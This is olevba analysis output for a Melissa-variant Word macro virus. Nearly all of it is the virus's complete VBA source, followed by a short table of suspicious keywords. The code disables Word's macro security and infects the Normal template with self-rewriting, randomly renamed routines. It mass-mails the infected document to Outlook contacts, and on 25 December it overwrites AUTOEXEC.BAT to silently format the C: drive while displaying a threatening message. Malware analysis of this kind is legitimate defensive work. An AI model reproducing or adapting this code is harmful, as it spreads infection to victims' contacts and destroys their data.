olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa.w-c7ee6389fb7e762e0721db22e56b199f607d9bf2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Melissa.w-c7ee6389fb7e762e0721db22e56b199f607d9bf2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1): Application.DisplayRecentFiles = (1 - 1)
End If
Call OS2069
If Day(Now) = 25 And Month(Now) = 12 Then
Open ("C:\AUTOEXEC.BAT") For Output As #1
Print #1, "@echo off"
Print #1, "@echo Vine...Vide...Vice...Moslem Power Never End..."
Print #1, "@echo Your Computer Have Just Been Terminated By -= CyberNET =- Virus !!!"
Print #1, "ctty nul"
Print #1, "format c: /autotest /q /u"
Close #1
MsgBox "Vine...Vide...Vice...Moslem Power Never End..." & Chr(13) & "You Dare Rise Against Me...The Human Era is Over, The CyberNET Era Has Come !!!", vbCritical + vbOKOnly, "(C)1999 - CyberNET"
Randomize: For BQ3993 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next BQ3993: End If
SS509 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
JV8336 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(9, 4), 4) <> "Call" Then
Set HG2166 = ActiveDocument.VBProject.VBComponents
Call KC886(HG2166)
BT695 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(9, 4), 4) <> "Call" Then
Set HG2166 = NormalTemplate.VBProject.VBComponents
Call KC886(HG2166)
HC6222 = True
Randomize
Dim r1(1 To 29) As String
r1(1) = "IC715": r1(2) = "PP9094": r1(3) = "QL8534": r1(4) = "BH4944": r1(5) = "TM6657": r1(6) = "SS509": r1(7) = "JV8336": r1(8) = "BT695": r1(9) = "HG2166": r1(10) = "HC6222"
r1(11) = "LJ6639": r1(12) = "JO966": r1(13) = "DA5691": r1(14) = "OV6716": r1(15) = "KE3056": r1(16) = "OS2069": r1(17) = "VQ799": r1(18) = "LF2896": r1(19) = "DT9624": r1(20) = "NQ7985"
r1(21) = "QO2419": r1(22) = "UV3595": r1(23) = "MI97": r1(24) = "KC886": r1(25) = "PF4847": r1(26) = "BJ368": r1(27) = "BQ3993": r1(28) = "MR7453": r1(29) = "DF3443"
For KE3056 = 1 To 29
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call TM6657(a1, r1(KE3056))
Next KE3056
ActiveDocument.Saved = True
End If
If HC6222 <> True And BT695 <> True Then GoTo LJ6639
If HC6222 = True Then HG2166.Item(1).CodeModule.AddFromstring ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, SS509 - 1) & _
vbCr & "Sub ViewVBCode()" & vbCr & "CommandBars(" & Chr(34) & "Tools" & Chr(34) & ").Controls(" & Chr(34) & "Macro" & Chr(34) & ").Enabled = False" & vbCr & "End Sub" & vbCr & "Sub ToolsMacro()" & vbCr & "ViewVBCode" & vbCr & "End Sub")
If BT695 = True Then HG2166.Item(1).CodeModule.AddFromstring ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, JV8336 - 8))
LJ6639:
If JV8336 <> 0 And SS509 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub
Private Function TM6657(OV6716, DA5691 As String)
On Error Resume Next
Dim IC715 As Long: Dim PP9094 As Long: Dim QL8534 As Long: Dim BH4944 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
IC715 = 1: PP9094 = 1: QL8534 = .CountOfLines: BH4944 = Len(.Lines(.CountOfLines, 1))
Do While .Find(DA5691, IC715, PP9094, QL8534, BH4944, True)
strline = .Lines(IC715, 1)
strline = Left(strline, PP9094 - 1) & OV6716 & Mid(strline, BH4944)
.ReplaceLine IC715, strline
IC715 = QL8534 + 1: PP9094 = 1
QL8534 = .CountOfLines
BH4944 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
Private Function OS2069()
On Error Resume Next
Dim DT9624, NQ7985, QO2419
Set DT9624 = CreateObject("Outlook.Application")
Set NQ7985 = DT9624.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "CyberNET") <> "(C)1999 - Indonesia by AnomOke!" Then
If DT9624 = "Outlook" Then
NQ7985.Logon "profile", "password"
For VQ799 = 1 To NQ7985.AddressLists.Count
Set DF3443 = NQ7985.AddressLists(VQ799)
BJ368 = 1
Set QO2419 = DT9624.CreateItem(0)
For LF2896 = 1 To DF3443.AddressEntries.Count
MR7453 = DF3443.AddressEntries(BJ368)
QO2419.Recipients.Add MR7453
BJ368 = _
BJ368 + 1
If BJ368 > 50 Then LF2896 = DF3443.AddressEntries.Count
Next LF2896
QO2419.Subject = "Message From " & Application.UserName
QO2419.Body = "This document is very Important and you've GOT to read this !!!"
QO2419.Attachments.Add ActiveDocument.FullName
QO2419.Send
MR7453 = ""
Next VQ799
NQ7985.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "CyberNET") = "(C)1999 - Indonesia by AnomOke!"
End If
End Function
Private Function KC886(HG2166)
Dim PF4847 As Object
For Each PF4847 In HG2166
PF4847.CodeModule.DeleteLines 1, _
PF4847.CodeModule.CountOfLines
Next PF4847
End Function
Private Function FileOpen()
On Error Resume Next
WordBasic.disableautomacros True
Dialogs(80).Show
Document_Close
End Function









+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
